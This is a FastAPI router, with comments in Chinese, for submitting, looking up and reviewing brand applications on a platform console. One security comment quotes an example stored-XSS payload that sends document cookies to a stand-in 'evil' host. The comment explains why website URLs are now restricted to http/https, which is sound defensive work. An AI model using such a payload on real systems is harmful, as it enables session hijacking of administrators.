"""Platform console 品牌申請 router(CR-0114 R2)。

- POST /platform/brand-applications      公開(landing 品牌 CTA;per-IP DB 限流)
- POST /platform/brand-applications:lookup  公開申請進度查詢(UAT R2 W3-6 免 email
                                            自助;email+id 雙精確匹配、防列舉 404)
- GET  /platform/brand-applications      平台管理員(?status= 過濾)
- POST /platform/brand-applications/{id}:approve   核准 + 回開站指引文字
- POST /platform/brand-applications/{id}:reject    拒絕(reason 必填)
"""

from __future__ import annotations

import logging

from fastapi import APIRouter, Depends, Request
from pydantic import BaseModel, EmailStr, Field

from core.deps import CurrentUser, require_platform_admin
from services import brand_application_service

logger = logging.getLogger("api.routers.platform_brand_applications")
router = APIRouter()


class BrandApplicationBody(BaseModel):
    # 欄位對齊原 VendorRegisterBody(auth.py)但**不收 password**:
    # 申請是意向書,核准後人工開站+聯絡,不建任何帳號(CR-0114 §4.2)。
    application_type: str = Field(pattern="^(brand|locksmith|distributor)$")
    company_name: str = Field(min_length=1, max_length=150)
    contact_name: str = Field(min_length=1, max_length=150)
    tax_id: str = Field(pattern=r"^\d{8}$", description="公司統編 8 碼")
    phone: str = Field(pattern=r"^09\d{8}$")
    email: EmailStr
    address: str | None = Field(default=None, max_length=500)
    notes: str | None = Field(default=None, max_length=1000)
    # 業界補充欄位（申請導入 /platform/apply 表單擴充；全選填、additive）
    # 2026-08-02 掃描：本端點**完全未認證**（submit_brand_application 無任何 Depends），
    # 而這個值會被 platform-console 的 BrandApplicationsPanel 直接渲染成 <a href>。
    # 原本只限長度不限 scheme → 任何人可送 `javascript:fetch('https://evil/'+document.cookie)`，
    # 平台**最高權限** admin 在後台點下去就中 stored XSS。
    # 前端的 rel="noopener noreferrer" 擋不住這個（那是防 tabnabbing 的）。
    # 只放行 http/https；前端另有一層 scheme 檢查（深度防禦）。
    website: str | None = Field(
        default=None, max_length=255, pattern=r"^https?://[^\s<>\"']+$"
    )
    coverage_regions: str | None = Field(default=None, max_length=500, description="服務涵蓋地區")
    store_count: int | None = Field(default=None, ge=0, le=100000, description="門市/據點數")
    expected_monthly_orders: str | None = Field(default=None, max_length=30, description="預估月工單量級距")
    main_brands: str | None = Field(default=None, max_length=500, description="主營品牌/產品")
    referral_source: str | None = Field(default=None, max_length=50, description="如何得知平台")


class LookupBody(BaseModel):
    """公開申請進度查詢(email + 申請編號雙精確匹配)。"""

    email: EmailStr
    application_id: str = Field(min_length=1, max_length=64, description="申請編號(UUID)")


class ApproveBody(BaseModel):
    slug: str | None = Field(default=None, max_length=30, description="品牌代號(未填自動產生)")
    review_notes: str | None = Field(default=None, max_length=1000)


class RejectBody(BaseModel):
    reason: str = Field(min_length=3, max_length=1000)


@router.post(
    "/platform/brand-applications",
    operation_id="submitBrandApplication",
    summary="品牌申請(公開,landing 表單)",
    status_code=201,
)
async def submit_brand_application(body: BrandApplicationBody, request: Request) -> dict:
    client_ip = request.client.host if request.client else None
    return await brand_application_service.submit(
        application_type=body.application_type,
        company_name=body.company_name,
        contact_name=body.contact_name,
        tax_id=body.tax_id,
        phone=body.phone,
        email=body.email,
        address=body.address,
        notes=body.notes,
        website=body.website,
        coverage_regions=body.coverage_regions,
        store_count=body.store_count,
        expected_monthly_orders=body.expected_monthly_orders,
        main_brands=body.main_brands,
        referral_source=body.referral_source,
        request_ip=client_ip,
    )


@router.post(
    "/platform/brand-applications:lookup",
    operation_id="lookupBrandApplication",
    summary="品牌申請進度查詢(公開;email+申請編號雙匹配,防列舉 404)",
    status_code=200,
)
async def lookup_brand_application(body: LookupBody, request: Request) -> dict:
    """UAT R2 W3-6 免 email 自助:申請人憑送出時取得的申請編號 + email 查進度。

    不匹配一律 generic 404(防列舉);rejected 才回 review_notes(駁回理由),
    核准備註不外洩。per-IP in-memory 輕量限流(service 層)。
    """
    client_ip = request.client.host if request.client else None
    return await brand_application_service.lookup(
        email=body.email,
        application_id=body.application_id,
        request_ip=client_ip,
    )


@router.get(
    "/platform/brand-applications",
    operation_id="listBrandApplications",
    summary="品牌申請列表",
    status_code=200,
)
async def list_brand_applications(
    status: str | None = None,
    user: CurrentUser = Depends(require_platform_admin),
) -> dict:
    return await brand_application_service.list_applications(status)


@router.post(
    "/platform/brand-applications/{applicationId}:approve",
    operation_id="approveBrandApplication",
    summary="核准品牌申請(回開站指引)",
    status_code=200,
)
async def approve_brand_application(
    applicationId: str,
    body: ApproveBody | None = None,
    user: CurrentUser = Depends(require_platform_admin),
) -> dict:
    return await brand_application_service.approve(
        app_id=applicationId,
        reviewer_id=user.user_id,
        slug=(body.slug if body else None),
        review_notes=(body.review_notes if body else None),
    )


@router.post(
    "/platform/brand-applications/{applicationId}:reject",
    operation_id="rejectBrandApplication",
    summary="拒絕品牌申請",
    status_code=200,
)
async def reject_brand_application(
    applicationId: str,
    body: RejectBody,
    user: CurrentUser = Depends(require_platform_admin),
) -> dict:
    return await brand_application_service.reject(
        app_id=applicationId,
        reviewer_id=user.user_id,
        reason=body.reason,
    )
